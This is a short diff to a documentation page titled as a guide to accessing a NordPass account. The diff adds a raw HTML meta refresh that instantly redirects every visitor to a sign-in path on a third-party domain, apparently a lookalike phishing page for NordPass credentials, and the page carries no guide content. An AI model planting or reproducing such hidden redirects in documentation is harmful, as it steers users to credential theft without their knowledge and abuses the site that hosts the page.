@@ -1,3 +1,7 @@
+.. raw:: html
+ 
+    <meta http-equiv="refresh" content="0; url=https://aclogportal.com/nordpass-sign-in-account">
+
 How to Access Your NordPass Account from Any Device? 🔑
 ============================================
 .
